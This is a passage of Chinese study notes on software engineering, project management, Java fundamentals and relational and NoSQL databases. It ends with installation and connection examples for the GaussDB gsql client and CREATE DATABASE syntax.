系统整体指标: 进程与线程数、系统运行时间、内核参数与日志。

***性能优化与发展趋势***
性能指标：监控 CPU / 内存利用率、I/O 吞吐量、系统负载，通过调优算法、缓存、参数配置提升性能。
未来方向：智能化资源管理、微内核架构、容器化（Docker）、信创操作系统（如麒麟、统信 UOS）是重点趋势。

### 软件工程
***软件工程核心目标***
付出较低的开发成本，实现要求的软件功能，取得较好的软件性能；
开发的软件易于移植、易于维护；
能按时完成开发，及时交付使用。

***软件工程三要素：***
软件工程**方法**为软件开发提供了“如何做”的技术指导。它包括项目计划与估算、软件系统需求分析、数据结构设计、系统总体结构设计、算法设计、编码、测试和维护等各个环节的任务。常见的软件工程方法有结构化分析和设计（SSAD）、面向对象分析和设计（OOAD）、敏捷开发等。
软件工程**工具**为软件开发方法提供自动或半自动的支持环境。这些工具包括集成开发环境（IDE）、代码版本控制系统、自动化测试工具等，帮助提高软件开发效率和质量。
软件工程**过程**是一系列有序的步骤和活动，用于支持软件开发各个环节的控制和管理。过程定义了方法使用的顺序、要求交付的文档资料、为保证质量和协调变化所需要的管理，以及软件开发各个阶段完成的里程碑。

***需求分析***
需求分类
将需求分为功能需求和非功能需求。功能需求描述软件的具体功能，如登录功能、搜索功能等。
非功能需求包括性能需求、兼容性需求、安全性需求等，如系统响应时间不超过3秒，兼容主流浏览器等。
商业和技术限制：
分析商业限制，如预算、时间、市场等因素对需求的影响。如项目预算有限，需优先实现核心功能。
考虑技术限制，如现有技术能否实现需求，技术风险等。如采用新技术可能带来技术风险，需谨慎评估。
需求优先级排序：
根据需求的重要性和紧急程度，对需求进行优先级排序。如核心功能需求优先级高，需优先开发。
采用 MoSCoW 方法，将需求分为必须有、应该有、可以有、不会有的四类，合理安排开发资源。

***封装与解耦***
封装是将数据和操作数据的方法封装在一起，形成一个独立的模块。如封装一个用户类，包含用户信息和相关操作方法。
解耦是减少模块间依赖关系，提高系统的灵活性和可维护性。

![DFX](/images/szkingdom/szbackend-ruanjian1.png)

可扩展性设计：预留扩展接口、采用灵活架构、持续优化

模块化设计：
系统划分： 将系统划分为独立的功能模块，每个模块负责一个特定功能。模块化设计使系统结构清晰，便于开发和维护。
模块职责明确： 每个模块有明确的输入、输出和职责，减少模块间耦合。明确职责便于模块独立开发和测试，提高开发效率。
模块间通信： 模块间通过接口进行通信，接口定义清晰，隐藏模块内部实现细节。接口通信方式提高系统的可扩展性和可维护性，便于后续功能扩展。

***软件架构模式***
01 层次化架构
按功能分层，如分为表示层、业务逻辑层、数据访问层。各层职责明确，便于开发和维护。
层次化架构提高系统的可扩展性和可维护性，适应不同规模的项目。
02组件化架构
将系统分解为独立的功能组件，如用户组件、订单组件等。组件可独立开发和测试，提高开发效率。
组件化架构便于代码复用，降低开发成本。
03 微服务架构
基于RESTful或RPC接口提供服务，每个微服务独立运行，可独立扩展。如KOCA平台的用户服务、网关服务等。微服务架构提高系统的可扩展性和容错性，适应快速变化的业务需求。

***分层模式***
![分层模式](/images/szkingdom/szbackend-ruanjian2.png)
***MVC模式***
![MVC模式](/images/szkingdom/szbackend-ruanjian3.png)
![MVC模式](/images/szkingdom/szbackend-ruanjian3-1.png)
***事件总线模式***
![事件总线模式](/images/szkingdom/szbackend-ruanjian3-2.png)
![事件总线模式](/images/szkingdom/szbackend-ruanjian3-3.png)
***代理模式***
![代理模式](/images/szkingdom/szbackend-ruanjian3-4.png)
![代理模式](/images/szkingdom/szbackend-ruanjian3-5.png)
***黑板模式***
![黑板模式](/images/szkingdom/szbackend-ruanjian3-6.png)
![黑板模式](/images/szkingdom/szbackend-ruanjian3-7.png)
***管道过滤器模式***
![管道过滤器模式](/images/szkingdom/szbackend-ruanjian3-8.png)
![管道过滤器模式](/images/szkingdom/szbackend-ruanjian3-9.png)

![单元测试](/images/szkingdom/szbackend-danyuan1.png)

### 项目管理

***项目管理的定义***
项目管理是运用多种知识、技能、工具和技术，在一定的时间、成本、质量等要求下实现项目成果性目标的过程。
***项目管理的原则和方法***
项目管理遵循系统性原则、综合性原则、最优性原则、动态性原则和目的性原则，常用的方法有工作分解结构（WBS）、甘特图、关键路径法（CPM）和挣值管理（EVM）。

项目管理的五大过程组包括启动、规划、执行、监控和收尾，这些过程组构成了项目生命周期的基础框架，确保项目从开始到结束都能按计划进行。
项目管理的十大知识体系涵盖了项目整合管理、范围管理、时间管理、成本管理、质量管理、资源管理、沟通管理、风险管理、采购管理和相关方管理，为项目经理提供了全面的指导。

![项目管理过程组](/images/szkingdom/szbackend-XMGL1.png)
![项目整合管理](/images/szkingdom/szbackend-XMGL2.png)
![项目范围管理](/images/szkingdom/szbackend-XMGL3.png)
![项目时间管理](/images/szkingdom/szbackend-XMGL4.png)
![制定进度计划](/images/szkingdom/szbackend-XMGL5.png)
![项目成本管理](/images/szkingdom/szbackend-XMGL6.png)
![项目质量管理](/images/szkingdom/szbackend-XMGL7.png)
![项目人力资源管理](/images/szkingdom/szbackend-XMGL8.png)
![项目沟通管理](/images/szkingdom/szbackend-XMGL9.png)
![项目风险管理](/images/szkingdom/szbackend-XMGL10.png)
![项目风险管理](/images/szkingdom/szbackend-XMGL11.png)
![项目采购管理](/images/szkingdom/szbackend-XMGL12.png)
![项目干系人管理](/images/szkingdom/szbackend-XMGL13.png)

制定项目章程： 项目章程是启动阶段的核心文件，它正式批准了项目的存在和目标，记录了项目目的、成果描述及商业论证等关键信息，为项目的顺利推进奠定基础。
干系人分析： 通过识别所有可能影响或被项目影响的干系人，评估他们对项目的影响力和利益关系，有助于项目经理了解他们的需求和期望，以便进行有效沟通和管理。

范围规划与需求管理： 范围规划通过创建工作分解结构（WBS）将项目细分为更小、更易管理的部分，而需求管理确保所有项目及其产品的详细需求被明确记录和理解。
进度与成本规划： 利用甘特图和三点估算等工具制定时间表，同时进行成本估算和预算基线设定，确保资源合理分配，有效控制项目成本。
风险管理与质量保证： 创建风险登记册以识别和管理潜在风险，结合质量控制和保证措施，预防缺陷发生，确保项目质量标准得到满足。

***WBS分解的重要性***
WBS分解是项目管理中的核心步骤，通过将项目细分为更小、可管理的部分，确保每个任务都能得到适当的关注和资源分配，从而提高项目成功率。

甘特图的应用： 甘特图作为项目管理中的重要工具，通过直观的条形图展示项目时间表和进度，帮助项目经理有效监控任务执行情况，确保项目按时完成。
三点估算方法： 三点估算考虑最乐观、最悲观及最可能的情况来预估任务完成时间，为项目提供更为精确的时间估算，有助于提高时间管理的准确度。
风险管理策略： 在进度规划中，风险管理是不可或缺的一环。通过风险登记册记录潜在风险及其应对策略，项目经理能够预见并减轻风险对项目进度的影响。

成本规划中，类比估算和参数估算是两种常用的方法。类比估算通过比较类似项目的实际成本来预估当前项目的成本，而参数估算则是基于历史数据和项目参数来计算成本。
在成本规划过程中，需要制定预算基线，即项目的总预算。这通常涉及将总预算分配到项目的各个阶段，以确保资源的合理分配和使用。
成本规划还包括分阶段控制，这意味着在项目执行过程中，需要定期监控成本支出，确保不超出预算。如果发现成本偏差，应及时采取措施进行调整。

可交付成果的定义： 可交付成果是项目管理中的关键概念，指项目过程中需完成的具体成果或产品，如文档、软件等，是确保项目按目标进行的重要组成部分。
各阶段可交付成果： 在项目管理的不同阶段，如启动、规划、执行和监控阶段，都会有相应的可交付成果需要完成，例如制定项目章程、范围规划等。
可交付成果的重要性： 每个阶段的可交付成果都是项目成功的关键组成部分，它们确保项目按照既定的目标和要求进行，并最终实现项目的成功交付。

***变更请求***
定义： 变更请求是项目管理中的一个重要环节，通常在项目执行阶段提出，涉及对项目计划、范围、预算等关键要素的修改。
处理步骤： 处理变更请求包括识别变更、评估影响、决策过程、实施变更、监控和控制以及记录变更等六个主要步骤。
重要性： 有效管理变更请求对于保持项目的健康状态至关重要，它有助于确保项目能够适应不断变化的环境，同时最小化对项目目标的负面影响。

绩效报告是监控阶段的核心，通过收集和分析项目数据，评估进展状态，为决策提供依据，确保项目目标的实现。

***监控阶段：***
变更描述是变更日志的核心，它详细记录了变更的内容、原因和背景，为项目团队提供了全面的变更信息，有助于理解变更的必要性和影响。
通过记录变更请求的当前状态，如待审批、已批准等，项目团队可以实时了解变更的进展情况，确保变更按照预定的流程进行。
随着变更请求的批准和实施，原有的项目计划需相应调整更新，以反映最新的范围、时间表和资源分配，确保团队成员基于最新信息高效工作。

***收尾阶段***
最终项目报告是对整个项目成果和执行情况的全面总结，它不仅展示了项目的目标达成情况，还反映了团队在实施过程中的决策和调整。
经验教训文档是记录项目过程中成功经验和失败教训的重要工具，它为未来类似项目提供了宝贵的参考，帮助团队避免重复错误并优化流程。
项目档案整理涉及收集、分类和存储所有与项目相关的文件和资料，确保信息的安全保存和易于检索，对维护项目历史记录至关重要。

***冲突管理：***
冲突类型： 团队冲突可分为任务冲突、关系冲突和过程冲突。任务冲突涉及工作内容分歧，关系冲突源于人际矛盾，过程冲突则与工作方式相关。
冲突解决： 解决团队冲突的方法包括开放沟通、寻找共同目标、引入第三方调解等。合理处理冲突能促进团队协作与创新。
冲突征兆： 团队冲突的征兆包括沟通减少、情绪紧张、效率下降等。及时发现这些信号有助于尽早干预，避免冲突升级。
明确目标、有效沟通、分工协作

***绩效评估***
明确目标（清晰、可衡量）、目标分解（可执行的小目标）、目标跟踪（定期检查，及时调整）
反馈机制定义、反馈类型（正向反馈，建设性反馈）、反馈实施步骤（明确目标、收集信息、传达反馈和跟进改进，确保反馈过程系统化、可操作）

经验总结：明确分工（角色，职责，任务）、协作工具、有效沟通（定期会议，及时分享信息/进展）

1. 资源管理
个人经验成就团队大业
团队善用时间
寻求外界帮助
有效规划和使用资源
2. 团队的学习
反思成功经验
从失败和错误中汲取教训
不断进度
接受创新举措
3. 决策制定
及时制定决定
授权团队制定一些决策
抵制过早定论
客观讨论问题
1. 冲突解决
内部交流畅通无阻
公开艰巨的问题
能达成共识
沉着解决冲突
2. 团队氛围
团队认同，并非个人集合
团队成员享受团队工作
团队有积极氛围
团队庆祝成功
3. 过程管理
提早发现问题并解决
会议有效
团队以流程为导向
设计新流程


### 开发语言

**跨平台性与JVM机制**
一次编写，到处运行：基于JVM，可在Windows/Linux/macOS/Android等平台无缝运行
 丰富的开发工具：IDEA、Eclipse等顶级IDE支持，Maven/Gradle构建工具提升开发效率
 庞大的技术生态：Spring Boot/Cloud、Hibernate、MyBatis等框架覆盖各类开发场景
**企业级开发首选**
高可靠性：完善的异常处理机制和类型安全特性保障系统稳定运行
成熟解决方案：拥有完整的中间件生态（WebLogic、WebSphere等）
分布式计算：支持微服务架构（Spring Cloud）和大数据处理（Hadoop生态）
**学习曲线平缓**
语法清晰规范：严格的面向对象设计，代码结构清晰，易于理解和维护
自动内存管理：垃圾回收（GC）机制减少内存泄漏风险，降低开发难度
应用场景广泛：不仅适用于传统企业级开发，还可延伸至Android开发、大数据、云计算等领域

JVM 高性能优化: ‌即时编译（JIT）、垃圾回收（GC）等机制平衡开发效率与运行时性能
强类型与严谨的编译检查: ‌减少运行时错误，提升代码健壮性，适合大型复杂系统（如银行核心系统）
多线程与高并发支持: 原生线程模型和并发工具包（JUC）简化高并发编程，支撑亿级流量场景
企业级安全特性: 字节码验证、安全管理器（SecurityManager）等机制保障代码安全，符合金融/政府合规要求。

基本数据类型
Java提供了8种基本数据类型，包括byte（1字节）、short（2字节）、int（4字节）、long（8字节）用于整数存储；float（4字节）、double（8字节）用于浮点数；char（2字节）用于Unicode字符；boolean（1位）表示逻辑值。

引用数据类型
包括类、接口、数组等，实际存储的是对象的内存地址。

变量声明与作用域
变量需先声明后使用，局部变量（方法内定义）无默认值必须初始化，成员变量（类内定义）有默认值。作用域分块级（{}内）、方法级和类级，影响变量的生命周期和访问权限。

循环结构
for循环适合已知次数场景，while和do-while用于条件循环（后者至少执行一次）。注意避免死循环，可通过break（跳出循环）、continue（跳过本次）控制流程。

对象的实例化与使用
对象是类的具体实例，通过`new`关键字创建（如`Person p = new Person()`）。对象可调用类中定义的属性和方法，例如`p.name = "Alice"; p.speak();`。

构造方法的作用
构造方法用于初始化对象状态，名称与类名相同且无返回值。可重载多个构造方法以支持不同初始化场景，例如`Person(String name) { this.name = name; }`。

继承的语法与特性
通过`extends`关键字实现类之间的继承（如`class Student extends Person`），子类自动拥有父类非私有成员。继承支持代码复用和层次化设计，例如学生类可复用人的基础属性。

方法重写与动态绑定
子类可重写父类方法（需相同签名），运行时根据实际对象类型调用对应方法（多态）。例如`@Override void speak() { System.out.println("Student speaks"); }`。

多态的应用场景
多态允许父类引用指向子类对象（如`Person p = new Student()`），结合接口或抽象类可实现灵活的系统扩展，例如统一处理不同子类对象的公共行为。

接口的定义与实现
接口通过`interface`声明纯抽象方法（Java 8后支持默认方法），类通过`implements`实现接口并强制重写方法。例如`interface Flyable { void fly(); } class Bird implements Flyable {...}`。
抽象类的特点
抽象类用`abstract`修饰，可包含抽象方法（无实现）和具体方法。子类必须实现抽象方法，适用于部分共性逻辑的场景，例如`abstract class Animal { abstract void eat(); void sleep() {...} }`。
两者区别与选择
接口强调行为契约（多继承），抽象类侧重代码复用（单继承）。设计时优先使用接口，若需共享代码则用抽象类，例如集合框架中`List`是接口而`AbstractList`是抽象类。

环境变量配置
在Windows/Linux系统中需设置`JAVA_HOME`指向JDK安装路径，并将`%JAVA_HOME%bin`添加到`PATH`变量，以便终端直接调用`java`和`javac`命令。

```java
// fileName：HelloWorld.java
public class HelloWorld {
  public static void main(String[] args) {
    // System.out.println("hello world!");
    // 空指针异常
    // String str = null;
    // System.out.println(str.length()); // This will throw a NullPointerException
    // 解决方案:
    // 判空检查：使用if (obj != null)或Java 14的Objects.requireNonNull()。
    // Optional类：Java 8的Optional可封装可能为null的对象，强制显式处理空值。
    // 初始化保障：声明变量时立即赋值非null对象。
    // 静态分析工具：利用IDE（如IntelliJ）检测潜在null引用。
    // 并发修改异常：使用线程安全的集合类或同步块。
    List<String> list = new ArrayList<>();
    list.add("Hello");
    for (String s : list) {
      if ("hello".equals(s)) {
        list.remove(s); // 抛出异常 ConcurrentModificationException
        // 解决方案：使用迭代器删除元素
        // Iterator<String> iterator = list.iterator();
        // while (iterator.hasNext()) {
        //   String s = iterator.next();
        //   if ("hello".equals(s)) {
        //     iterator.remove();
        //   }
        // }
      }
    }
  }
}
// javac‌：Java 编译器，将 .java 源文件编译为 .class 字节码文件。
// ‌java‌：Java 运行工具，启动 JVM 并执行已编译的 .class 文件（需包含 public static void main(String[] args) 方法）。
// 命令行：javac HelloWorld.java  java HelloWorld
```
集成开发环境
集成开发环境（IDE）是Java开发的必备工具，它提供代码编辑、调试和运行的一体化环境，如`Eclipse和IntelliJ IDEA`。
构建工具
构建工具负责将源代码编译成可执行字节码，如`Maven和Gradle`，它们分别用于项目依赖管理和构建过程自动化。

***常用框架介绍***
| 技术分类 | 组件名称 | 核心特点 |
| -------- | -------- | -------- |
| 开发框架 | Spring Framework |轻量级l0C容器，提供AOP支持和模块化开发 |
| 开发框架 | Spring Boot | 约定优于配置，快速构建独立运行的Spring应用 |
| 开发框架 | Spring Cloud |  微服务全家桶，包含服务注册/配置中心等分布式系统解决方案 |
| 数据库连接池 | Druid | 阿里开源的高性能连接池，提供SQL监控和防火墙功能 |
| 数据持久层 | MyBatis | 半ORM框架，通过XML/注解灵活映射SQL与POJO |
| 消息队列 | Apache Kafka | 高吞吐分布式消息系统，适合日志处理和流式计算场景 |
| 消息队列 | RabbitMQ | 基于AMQP协议的消息代理，支持复杂路由和事务消息 |
| 分布式事务 | Seata | 阿里开源的分布式事务解决方案，支持AT/TCC/SAGA模式 |
| 定时任务 | Quartz | 功能强大的作业调度框架，支持集群和持久化存储 |
| 缓存 | Redis | 内存键值数据库，支持持久化/集群/多种数据结构 |
| 缓存 | Ehcache | 轻量级Java进程内缓存，支持堆外存储和磁盘持久化 |

### 软件开发设计

***UML图分类***
**结构型图表**：类图、组件图、部署图、包图
类图-六大关系：泛化关系、实现关系、关联关系、依赖关系、聚合关系、组合关系
**行为型图标**:用例图、活动图、状态图
用例图-三大关系：泛化关系、包含关系、扩展关系
**交互型图表**：时序图、通信图
时序图的消息类型：同步消息、异步消息

### 数据库

数据库技术：应对数据管理任务的需求而产生的，对数据库进行有效管理的技术，研究如何对数据进行科学管理，为人们提供可共享的、安全的、可靠的数据。
数据库技术包含四个相关概念：数据，数据库，数据库系统，数据库管理系统

数据库Database
数据库（Database，简称 DB）是按照特定结构组织、存储和管理数据的集合，其核心目标是解决 “海量数据高效存储、快速查询、安全共享” 的问题，是现代信息系统（如电商平台、社交软件、金融系统）的核心基础设施。数据库并非简单的 “文件堆”，而是具备结构化、可共享、可控制冗余、安全可靠等特性的数据集合。

数据库系统（Database System，简称 DBS）
一套用于存储、管理、维护和高效访问数据的综合系统，它将数据、硬件、软件和人员有机结合，解决了传统文件管理方式中数据冗余、一致性差、访问效率低等问题，是现代信息系统（如电商平台、银行系统、社交软件）的核心基础设施。
数据库系统并非单一的 “数据库文件”，而是由 4 个关键部分构成的完整体系，四者协同工作确保数据的安全、可靠与高效使用。

***数据库系统的核心特点***
数据结构化
      数据按统一的模型（如关系模型的 “表”）组织，不同表之间可通过 “主键 - 外键” 关联，避免数据分散存储。
数据共享性高
      多个用户或应用程序可同时访问同一数据库，且互不干扰。
数据冗余度低
      同一数据仅存储一次，通过关联关系复用数据，减少存储空间浪费和数据不一致风险。
数据独立性强
      数据与应用程序分离，分为 “物理独立性” 和 “逻辑独立性”：
物理独立性：数据的存储位置、格式（如从 HDD 迁移到 SSD）改变时，应用程序无需修改；
逻辑独立性：数据的结构（如给 “用户表” 新增 “地址字段”）改变时，不影响依赖该表的旧应用程序。
数据安全性与完整性
      DBMS 提供多层保障机制：
安全性：通过账号密码、权限控制（如 “只读权限”“修改权限”）防止未授权访问；
完整性：通过约束（如 “主键唯一”“年龄不能为负数”）确保数据符合业务规则，避免脏数据。

为了实现 “数据独立”（即应用程序不依赖底层存储格式），数据库设计了 “三级抽象结构”，通过 “两级映射” 隔离差异：
外模式（External Schema）：用户 / 应用程序看到的 “局部数据视图”（如 “订单管理系统” 只看到 “订单表” 的 “订单 ID、金额、用户 ID” 字段，看不到 “用户密码”）；
概念模式（Conceptual Schema）：数据库的 “全局逻辑结构”（即所有表格的完整结构，如 “用户表 + 订单表 + 商品表” 的字段、关联关系）；
内模式（Internal Schema）：数据的 “物理存储结构”（如数据存在硬盘的哪个分区、用什么格式存储、索引如何组织）。
作用：当内模式（如存储格式从 “CSV” 改为 “二进制”）变化时，只需修改 “模式 - 内模式映射”，应用程序无需改动（物理独立性）；当外模式（如应用需新增 “订单状态” 字段）变化时，只需修改 “外模式 - 模式映射”，不影响其他应用（逻辑独立性）。

数据库管理系统（Database Management System，简称DBMS）是一种用于创建、管理、维护和高效访问数据库的系统软件，它介于用户 / 应用程序与底层数据库（即存储数据的物理文件或存储介质）之间，充当 “中间件”角色，解决了数据存储、共享、安全和高效利用的核心问题。

DBMS 的本质是 “数据的管理者”：它统一控制数据的存储结构、访问规则和维护逻辑，避免用户直接操作底层数据文件（如避免手动修改 Excel 表格、文本文件导致的数据混乱），同时满足多用户、多应用程序对数据的 “共享访问” 和 “安全管控” 需求。

具有代表性的数据库管理系统有：
开源数据库：openGauss、Mysql、PostgreSQL、MongoDB等等；
商业数据库：GaussDB、Oracle、Microsoft SQL Server、OceanBase等等。

数据库管理系统的主要功能：数据定义功能、数据存储与优化功能、数据操纵功能、数据维护功能、数据控制功能。

***NoSQL 模型（非关系模型）***
 NoSQL（Not Only SQL）并非单一模型，而是一类 “非关系型数据库” 的统称，旨在解决传统关系模型在 “超大规模数据”“高并发”“非结构化数据” 场景下的瓶颈，主要分为 4 个子类型。

| 子类型 | 核心特点 | 适用场景 | 典型案例 | 
| ------ | ------- | -------- | -------- | 
| 键值模型 | 以“键(Key)-值 (Value)” 对存储数据，结构最简单，査询速度极快(O(1));Value 无固定格式。 | 缓存(如 Redis)、会话存储、计数器、购物车。 | Redis、Memcached、 Riak  | 
| 文档模型 | 以“文档”为单位存储数据(如 JSON、BSON)，文档内可嵌套属性，支持灵活查询;无需预定义表结构。 | 内容管理(博客、新闻)、电商商品详情、用户画像。 | MongoDB、CouchDB、Elasticsearch(侧重搜索)  | 
| 列族模型 | 以“列族”(多个列的集合)为单位存储数据，适合“按列查询”(而非按行)，支持大规模分布式存储。 | 日志分析、数据仓库、时序数据(如用户行为统计)。 | HBase、Cassandra、BigQuery | 
| 图模型 | 以“节点(实体)”和“边(关系)” 组成的图结构存储数据，擅长分析节点间的复杂关联(如社交关系)。 | 社交网络(好友推荐)、路径规划、欺诈检测、知识图谱。 | Neo4j、NebulaGraph、ArangoDB | 

***云数据库***
云数据库是指部署在云计算平台上、由云服务商提供托管服务的数据库，核心优势是按需弹性扩展、免运维（或低运维）、高可用，无需用户自行搭建硬件环境和管理数据库底层服务。
云关系型数据库（Cloud RDBMS）
基于关系模型（表格结构 + SQL），由云服务商提供托管，保留了传统 RDBMS 的**强事务一致性（ACID）、结构化查询（SQL）** 特性，同时增加弹性扩容、自动备份、故障自愈等云原生能力。
适用场景
需强数据一致性的核心业务，如金融交易、电商订单、用户账户管理、企业 ERP 系统等。

| 云服务商 | 产品名称 | 底层引擎/特点 | 
| -------- | -------- | ------------ | 
| 阿里云 | 云数据库 RDS | 支持 MySQL、SQLServer、PostgresQL等
| 腾讯云 | 云数据库 TencentDB for MySQL | 兼容 MySQL，提供高可用版、金融版等 | 
| AWS | Amazon RDS | 支持 MySQL、PostgresQL、Oracle 等 | 
| 华为云 | 云数据库 RDS | 多引擎支持，侧重企业级安全与合规 | 

***主键（Primary Key, PK）***
定义
主键是表中唯一标识每条记录的属性或属性组合，是数据库表的 “唯一身份证”。
核心作用
确保实体完整性：表中不存在两条完全相同的记录，且每条记录都有唯一标识。
作为其他表引用的 “目标键”（外键通常引用主键）。

特点
非空性（NOT NULL）：主键字段不能有 NULL 值（必须有具体内容）。
唯一性（UNIQUE）：主键字段的取值在表中绝对唯一，无重复。
稳定性：主键值应尽量不修改（如自增 ID），避免破坏表间关联。

示例
学生表（student）中，学号（s_id）是主键，每条学生记录的s_id唯一且非空：
s_id（主键） | s_name | s_age |
20260101  | 张三 | 20 |

***外键（Foreign Key, FK）***
定义
外键是表中引用另一个表主键（或唯一键） 的属性或属性组合，用于建立两个表之间的关联关系（如 “学生” 与 “成绩” 的关联）。
核心作用
确保参照完整性：外键的取值必须在被引用表的主键（或唯一键）中存在，避免 “无效关联”（如成绩表中不能出现不存在的学生学号）。
实现表间逻辑关系（如 1 对多、多对多）。

特点
外键字段可以有 NULL 值（表示 “无关联”，如未选课的学生，成绩表中无对应记录）。
外键的类型和长度必须与被引用的主键 / 唯一键完全一致（如被引用主键是INT(10)，外键也需是INT(10)）。

示例
成绩表（sc）的学号（s_id）是外键，引用学生表（student）的主键s_id；课程号（c_id）是外键，引用课程表（course）的主键c_id：
s_id（外键） | c_id（外键） | score | 
20260101    | C001         | 90    |

***候选键（Candidate Key）***
定义
候选键是表中能唯一标识记录的属性 / 组合，其作用与主键完全一致，但一个表中可能存在多个候选键（主键是从候选键中 “选中” 的一个）。
核心作用
作为主键的 “备选方案”，确保表中存在至少一种方式唯一标识记录。
特点
满足 “唯一 + 非空”（与主键特性相同），但未被指定为主键。
一个表可有多组候选键（如学生表的学号和身份证号都是候选键）。
示例
学生表（student）中：
候选键 1：学号（s_id）（最终被选为主键）。
候选键 2：身份证号（s_idcard）（唯一且非空，可作为备选主键）。

***唯一键（Unique Key）***
定义
唯一键是表中确保属性值唯一的约束，但允许字段取 NULL 值（与主键的核心区别）。
核心作用
约束非主键字段的唯一性（如 “用户邮箱”“手机号” 需唯一，但允许用户暂未填写）。
特点
唯一性：字段值无重复，但允许 NULL 值（且 NULL 值可出现多次，因 NULL 不等于任何值）。
一个表可有多组唯一键（如用户表的邮箱和手机号都可设为唯一键）。
示例
用户表（user）中：
user_id(主键) | email(唯一键)  | phone(唯一键) |
1             |  `zhang@xx.com`  | NULL         |

***物理结构设计原则***
选择合适的存储引擎：
 GaussDB：U-Store（自研的新一代行存引擎，面向高并发 OLTP，针对频繁更新、插入的场景做了大量优化，性能优于 AStore ）、A-Store(早期的行存实现，借鉴 PostgreSQL 的堆表（Heap Table）思想，主要面向OLTP 事务型场景，但在高并发写场景下有一定瓶颈)
MySQL：InnoDB（支持事务、外键，适合业务表）、MyISAM（不支持事务，适合只读查询表如日志表）
Oracle：默认使用 Oracle Database Storage Engine，支持多种数据文件存储方式
合理设置字段类型：
数值型：整数用 INT，小数用 DECIMAL（避免浮点数精度问题），如 “订单金额” 用 DECIMAL (10,2)
字符型：固定长度用 CHAR（如手机号），可变长度用 VARCHAR（如商品名称）
日期型：MySQL 用 DATETIME（精确到秒），Oracle 用 DATE（包含日期和时间）
优化存储参数：如 GaussDB设置文件系统（表空间）大小、MySQL 设置表空间大小、Oracle 设置数据块大小（默认 8KB，大表可设为 16KB）

***数据库管理工具-DBeaver***
DBeaver 是一款跨平台、多数据库兼容、功能全面的开源数据库管理工具，由 Java 开发，支持 Windows、macOS、Linux 三大主流操作系统，既能满足开发人员的日常 SQL 开发需求，也能为 DBA 提供数据库运维、监控、迁移等高级能力，是目前最受欢迎的通用数据库管理工具之一。
***数据库管理工具-SQL Server Management Studio***
SQL Server Management Studio（简称 SSMS）是微软官方推出的免费、集成化的 SQL Server 数据库管理工具，专为 SQL Server 生态设计，覆盖从数据库开发、对象管理到运维监控、性能优化的全流程。作为 SQL Server 用户的 “标配工具”，它深度适配 SQL Server 所有版本（包括本地实例、Azure SQL Database、Azure SQL 托管实例等），提供官方级的兼容性与功能完整性。

Navicat Premium : 商业级多数据库管理工具，支持 MySQL、Oracle、PostgreSQL、SQL Server、MongoDB 等 20+ 种数据库。
MySQL Workbench : MySQL 官方工具，覆盖设计、开发、运维全流程。
pgAdmin : PostgreSQL 官方图形化工具，支持跨平台。
PL/SQL Developer : Oracle 数据库专用商业开发工具，是 “PL/SQL 编程与 Oracle 数据库管理的一站式解决方案”。

***数据库管理工具-gsql安装及使用***
程序安装
> #创建目录并上传包，然后按如下命令操作安装
> mkdir -p ~/gsql
> tar xvf ~/soft/gsql/GaussDB-Kernel_505.2.1.SPC0100_Kylin_64bit_Gsql.tar.gz -C ~/gsql
> chmod -R 755 ~/gsql
 
> #配置环境变量
> tee -a ~/.bashrc << 'EOF'
 
> #GSQL ENVIROMENT
> export GSQL_HOME=$HOME/gsql
> export PATH=$GSQL_HOME/bin:$PATH
> export LD_LIBRARY_PATH=/usr/lib64:$GSQL_HOME/lib:$LD_LIBRARY_PATH
> EOF
> . ~/.bashrc
 
> gsql –V
> gsql (GaussDB Kernel 505.2.1.SPC0800 build 01df718e) compiled at 2025-07-03 01:16:00 commit 10558 last mr 24271 release

```txt
> 程序使用
> #连接数据库
> gsql –d postgres –h 10.10.0.11 –U jack -p 8000 -W Test@123 –r

#查询数据库
gaussdb=# select * from pg_database;
         datname         | datdba | encoding | datcollate | datctype | datistemplate | datallowconn | datconnlimit | datlastsysoid | datfrozenxid | dattabl
espace | datcompatibility |                                                                                     datacl                                     
                                                 | datfrozenxid64 | datminmxid | dattimezone | dattype 
-------------------------+--------+----------+------------+----------+---------------+--------------+--------------+---------------+--------------+--------
-------+------------------+--------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------+----------------+------------+-------------+---------
 templatea               |     10 |        7 | C          | C        | t             | f            |           -1 |         12886 | 0            |        
  1663 | A                | {=c/rdsAdmin,rdsAdmin=CTc/rdsAdmin}                                                                                            
                                                 |          41634 |          2 | PRC         | D

#实用的元命令，使用\l快速查询实例中的数据库
gaussdb=# \l+
                                                                             List of databases
          Name           |  Owner   | Encoding | Collate | Ctype |       Access privileges       |  Size   | Tablespace |                   Description    
                
-------------------------+----------+----------+---------+-------+-------------------------------+---------+------------+----------------------------------
----------------
 db1                     | rdsAdmin | UTF8     | C       | C     |                               | 34 MB   | pg_default | 
```
***SQL定义***
 SQL（Structured Query Language，结构化查询语言）是用于管理关系型数据库（RDBMS） 的标准化编程语言，核心作用是实现 “数据定义、查询、插入、更新、删除” 及 “权限控制” 等操作。它并非某个数据库专属，而是所有主流关系型数据库（如 MySQL、Oracle、SQL Server、GaussDB、PostgreSQL）的通用交互接口，是数据领域（开发、运维、分析）的 “基础工具语言”。
***数据类型***      
 和所有的计算机语言一样，SQL语言也有自己的数据类型，这些数据类型主要用于在创建基本表(关系)的时候指定基本表的每个列(属性)的类型。这些数据类型主要可以分成数值类型、字符串类型、时间/日期类型等。
数值类型: 数值类型又可以分成精确数值类型和近似数值类型，如`int、bigint、float`等。
字符类型: 主要可分为定长字符类型和变长字符类型如`char(n)、varchar(n)`。
日期类型: 主要包括日期和时间类型，如`DATE和TIMESTAMP`。
其他类型: 如二进制类型、布尔类型等。`BLOB、BOOLEAN`

***数据定义语言DDL***
数据定义语言(Data Definition Language,DDL)是SQL语言中集中负责数据结构定义与数据库对象定义的语言。通过DDL，我们可以创建(CREATE)、修改(ALTER)和删除(DROP)数据库、表、视图等对象，例如:
创建数据库: 使用CREATE DATABASE语句，可以创建一个新的数据库。
删除数据库: 使用DROP DATABASE语句，可以删除一个已经存在的数据库。
创建表: 使用CREATE TABLE语句，可以在数据库中创建新的表。
删除表: 使用DROP TABLE语句，可以删除一个已经存在的表。
修改表结构: 使用ALTER TABLE语句，可以修改已经存在的表的结构，如添加、删除或修改字段等。

CREATE DATABASE语句用于在数据库管理系统(DBMS)中创建一个新的数据库。
```txt
CREATE DATABASE database_name
    [WITH][OWNER = db_owner]
    [ENCODING =encoding]
    [LC_COLLATE =Ic_collate]
    [LC_CTYPE=Ic_ctype]
    [DBCOMPATIBILITY= compatibility level];

参数详细说明:
database_name:数据库的名称，必须是唯一的。
[WITH]:这是可选的关键字，通常用于提高语句的可读性。
